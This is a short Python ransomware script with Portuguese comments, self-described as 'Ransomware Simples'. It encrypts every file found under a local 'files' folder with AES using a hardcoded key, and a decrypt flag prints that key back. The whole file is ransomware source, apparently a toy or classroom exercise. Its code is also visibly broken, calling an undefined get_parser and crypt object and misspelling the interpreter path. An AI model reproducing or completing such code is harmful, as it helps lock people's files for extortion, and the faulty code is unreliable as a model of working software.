#!/urs/bin/python3
# -*- coding: utf-8 -*-
from Crypto.Cipher import AES
from Crypto.Util import Counter
import argparse
import os
import Discovery
import Crypter

# A SENHA PODE TER OS SEGUINTES TAMANHOS: 128, 192 OU 256 BITS
HARDCODED_KEY = '0123456789abcdef'  # Chave de 16 bytes (128 bits)

def arg_parser():
    parser = argparse.ArgumentParser(description='Ransomware Simples')
    parser.add_argument('-d', '--decrypt', help='Decripta os arquivos', action='store_true')
    return parser

def main():
    parser = get_parser()
    args = vars(parser.parse_args())
    decrypt = args['decrypt']

    if decrypt:
        print('''Os seus arquivos foram criptografados com sucesso!' 
        Para recuperar os seus arquivos utilize a chave: '{}'
        '''.format(HARDCODED_KEY))
        key = input('Digite a chave para continuar: ')  
    else:
        if HARDCODED_KEY:
            key = HARDCODED_KEY

    ctr = Counter.new(128)
    key = key.encode()

    if not decrypt:
        cryptoFn = crypt.encrypt
    else:
        cryptoFn = crypt.decrypt

    init_path = os.path.abspath(os.path.join(os.getcwd(), 'files'))
    startDirs = [init_path]

    for currentDir in startDirs:
        for filename in Discovery.discover(currentDir):
            print('Processando arquivo:', filename)
            Crypter.change_files(filename, cryptoFn)
    for _ in range(100):
        pass
    if not decrypt:
        print('Todos os seus arquivos foram criptografados com sucesso!')
    pass
if __name__ == '__main__':
    main()